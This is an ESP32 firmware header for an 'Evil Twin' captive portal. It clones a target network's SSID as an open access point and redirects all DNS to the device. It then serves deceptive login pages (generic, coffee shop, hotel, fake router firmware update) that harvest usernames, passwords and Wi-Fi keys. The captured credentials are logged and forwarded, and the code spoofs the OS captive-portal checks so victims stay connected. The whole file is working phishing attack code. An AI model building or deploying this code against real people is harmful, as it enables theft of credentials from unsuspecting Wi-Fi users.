#pragma once
// ############################################################################
//  gg_portal.h  -  KODI NRF24  /  Evil Twin captive portal
//
//  Clones a target WiFi AP's SSID as an open network. A DNS server redirects
//  all domains to the ESP32 and a web server serves a fake login page.
//  Captured credentials are stored in RAM and can be saved to NVS.
//
//  Gated by GG_ENABLE_PORTAL in gh_config.h (default ON).
// ############################################################################

#include <Arduino.h>
#include "gh_config.h"

// Portal type enum — always available so menu code compiles
enum GgPortalType : uint8_t { GG_PT_DEFAULT=0, GG_PT_COFFEE, GG_PT_HOTEL, GG_PT_UPDATE, GG_PT_COUNT };
static uint8_t ggPortalType = GG_PT_DEFAULT;

#if GG_ENABLE_PORTAL

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"

static GgCred  ggCredStore[GG_CRED_MAX];
static int     ggCredCount    = 0;
static bool    ggPortalActive = false;
static char    ggPortalSsid[33] = "";
static uint8_t ggPortalClients = 0;
static String  ggPortalUrl;

static DNSServer ggDns;
static WebServer ggWeb(80);

static const char GG_PORTAL_PAGE[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{width:90%;max-width:380px;background:#fff;border-radius:12px;padding:32px;box-shadow:0 4px 24px rgba(0,0,0,.12)}
.l{text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;margin-bottom:4px}
.s{text-align:center;color:#666;font-size:13px;margin-bottom:24px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none}
input:focus{border-color:#0066cc}
button{width:100%;padding:14px;margin-top:12px;background:#0066cc;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
.f{text-align:center;color:#999;font-size:11px;margin-top:16px}
</style></head><body>
<div class="c">
<div class="l">%SSID%</div>
<div class="s">Sign in to access the network</div>
<form action="/login" method="POST">
<input name="user" placeholder="Email or Username" required autocomplete="off">
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="f">Secure connection</div>
</div>
</body></html>)rawliteral";

static const char GG_PORTAL_OK[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>body{font-family:Arial,sans-serif;text-align:center;padding:60px 20px;background:#f0f2f5}
h2{color:#28a745;margin-bottom:12px}p{color:#666}</style>
</head><body>
<h2>&#10003; Connected!</h2>
<p>You are now connected to the network.</p>
</body></html>)rawliteral";

static const char* const GG_PT_LABEL[] = { "Default", "Coffee", "Hotel", "Update" };

static const char GG_PORTAL_COFFEE[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Free WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,Arial,sans-serif;background:#f5f0e8;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{width:90%;max-width:380px;background:#fff;border-radius:12px;padding:32px;box-shadow:0 4px 24px rgba(0,0,0,.12)}
.l{text-align:center;font-size:20px;font-weight:700;color:#6B4226;margin-bottom:4px}
.s{text-align:center;color:#8B7355;font-size:13px;margin-bottom:24px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none}
button{width:100%;padding:14px;margin-top:12px;background:#6B4226;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600}
.f{text-align:center;color:#999;font-size:11px;margin-top:16px}
</style></head><body>
<div class="c">
<div class="l">%SSID% Free WiFi</div>
<div class="s">Connect with your email to enjoy complimentary WiFi</div>
<form action="/login" method="POST">
<input name="user" placeholder="Email address" required autocomplete="off">
<input name="pass" type="password" placeholder="Create a password" required>
<button type="submit">Connect Free</button>
</form>
<div class="f">By connecting you agree to our terms</div>
</div>
</body></html>)rawliteral";

static const char GG_PORTAL_HOTEL[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Guest WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,Arial,sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{width:90%;max-width:380px;background:#fff;border-radius:12px;padding:32px;box-shadow:0 4px 24px rgba(0,0,0,.3)}
.l{text-align:center;font-size:20px;font-weight:700;color:#1a1a2e;margin-bottom:4px}
.s{text-align:center;color:#666;font-size:13px;margin-bottom:24px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none}
button{width:100%;padding:14px;margin-top:12px;background:#c9a96e;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600}
.f{text-align:center;color:#999;font-size:11px;margin-top:16px}
</style></head><body>
<div class="c">
<div class="l">%SSID% Guest Access</div>
<div class="s">Enter your room number and last name</div>
<form action="/login" method="POST">
<input name="user" placeholder="Last name" required autocomplete="off">
<input name="pass" placeholder="Room number" required>
<button type="submit">Connect</button>
</form>
<div class="f">Complimentary guest internet access</div>
</div>
</body></html>)rawliteral";

static const char GG_PORTAL_UPDATE[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Update</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{width:90%;max-width:380px;background:#fff;border-radius:12px;padding:32px;box-shadow:0 4px 24px rgba(0,0,0,.12)}
.w{background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:12px;margin-bottom:16px;text-align:center;color:#856404;font-size:13px}
.l{text-align:center;font-size:20px;font-weight:700;color:#dc3545;margin-bottom:4px}
.s{text-align:center;color:#666;font-size:13px;margin-bottom:24px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none}
button{width:100%;padding:14px;margin-top:12px;background:#dc3545;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600}
.f{text-align:center;color:#999;font-size:11px;margin-top:16px}
</style></head><body>
<div class="c">
<div class="w">Router firmware update required</div>
<div class="l">%SSID% Security Update</div>
<div class="s">Re-enter your WiFi password to apply the update</div>
<form action="/login" method="POST">
<input name="user" placeholder="Network admin name" required autocomplete="off">
<input name="pass" type="password" placeholder="WiFi password" required>
<button type="submit">Apply Update</button>
</form>
<div class="f">This update fixes a critical vulnerability</div>
</div>
</body></html>)rawliteral";

static inline void ggPortalHandleLogin() {
  if (ggWeb.hasArg("user") && ggWeb.hasArg("pass")) {
    if (ggCredCount < GG_CRED_MAX) {
      GgCred& c = ggCredStore[ggCredCount];
      strncpy(c.user, ggWeb.arg("user").c_str(), 32); c.user[32] = '\0';
      strncpy(c.pass, ggWeb.arg("pass").c_str(), 32); c.pass[32] = '\0';
      ggCredCount++;
      Serial.printf("[portal] captured: %s / %s\n", c.user, c.pass);
      ghDataForward(2, (const uint8_t*)&c, sizeof(GgCred), ghBridge);
    }
  }
  ggWeb.send_P(200, "text/html", GG_PORTAL_OK);
}

static inline void ggPortalHandleRoot() {
  const char* tmpl;
  switch (ggPortalType) {
    case GG_PT_COFFEE: tmpl = GG_PORTAL_COFFEE; break;
    case GG_PT_HOTEL:  tmpl = GG_PORTAL_HOTEL;  break;
    case GG_PT_UPDATE: tmpl = GG_PORTAL_UPDATE;  break;
    default:           tmpl = GG_PORTAL_PAGE;    break;
  }
  String page = FPSTR(tmpl);
  String safeSsid = ggPortalSsid;
  safeSsid.replace("&","&amp;"); safeSsid.replace("<","&lt;");
  safeSsid.replace(">","&gt;"); safeSsid.replace("\"","&quot;");
  page.replace("%SSID%", safeSsid);
  ggWeb.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  ggWeb.sendHeader("Pragma", "no-cache");
  ggWeb.send(200, "text/html", page);
}

static inline void ggPortalRedirect() {
  ggWeb.sendHeader("Location", ggPortalUrl, true);
  ggWeb.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  ggWeb.sendHeader("Pragma", "no-cache");
  ggWeb.send(302, "text/plain", "");
}

// iOS CNA checks this after login — return "Success" once creds captured
// so the CNA mini-browser closes and phone stays connected
static inline void ggPortalAppleDetect() {
  if (ggCredCount > 0) {
    ggWeb.send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
  } else {
    ggPortalRedirect();
  }
}

static inline void ggPortalBegin(const char* ssid, uint8_t channel) {
  strncpy(ggPortalSsid, ssid, 32); ggPortalSsid[32] = '\0';
  WiFi.mode(WIFI_AP);
  delay(100);
  wifi_country_t cty = { "XX", 1, 14, 78, WIFI_COUNTRY_POLICY_MANUAL };
  esp_wifi_set_country(&cty);
  WiFi.softAP(ssid, NULL, channel, 0, 8);
  delay(500);
  esp_wifi_set_max_tx_power(78);

  IPAddress ip = WiFi.softAPIP();
  ggPortalUrl = "http://" + ip.toString() + "/portal";

  ggDns.setErrorReplyCode(DNSReplyCode::NoError);
  ggDns.start(53, "*", ip);

  ggWeb.on("/portal", HTTP_GET, ggPortalHandleRoot);
  ggWeb.on("/login", HTTP_POST, ggPortalHandleLogin);
  // Apple CNA detection
  ggWeb.on("/hotspot-detect.html", HTTP_GET, ggPortalAppleDetect);
  ggWeb.on("/library/test/success.html", HTTP_GET, ggPortalAppleDetect);
  // Android captive portal detection
  ggWeb.on("/generate_204", HTTP_GET, ggPortalRedirect);
  ggWeb.on("/gen_204", HTTP_GET, ggPortalRedirect);
  // Windows NCSI
  ggWeb.on("/connecttest.txt", HTTP_GET, ggPortalRedirect);
  ggWeb.on("/ncsi.txt", HTTP_GET, ggPortalRedirect);
  ggWeb.on("/redirect", HTTP_GET, ggPortalRedirect);
  // Firefox
  ggWeb.on("/success.txt", HTTP_GET, ggPortalRedirect);
  ggWeb.on("/canonical.html", HTTP_GET, ggPortalRedirect);
  // Catch-all: redirect to portal
  ggWeb.onNotFound(ggPortalRedirect);

  ggWeb.begin();
  ggPortalActive = true;
  ggPortalClients = 0;
  ggCredCount = 0;
  Serial.printf("[portal] AP '%s' ch%u @ %s ready\n", ssid, channel, ip.toString().c_str());
}

static inline void ggPortalPump() {
  if (!ggPortalActive) return;
  ggDns.processNextRequest();
  ggWeb.handleClient();
  wifi_sta_list_t sl;
  if (esp_wifi_ap_get_sta_list(&sl) == ESP_OK) ggPortalClients = sl.num;
}

static inline void ggPortalEnd() {
  if (!ggPortalActive) return;
  ggWeb.stop();
  ggDns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  ggPortalActive = false;
  ggPortalClients = 0;
}

#else // !GG_ENABLE_PORTAL — stubs so cleanup code compiles

static bool ggPortalActive = false;
static inline void ggPortalEnd() {}
static inline void ggPortalPump() {}

#endif // GG_ENABLE_PORTAL
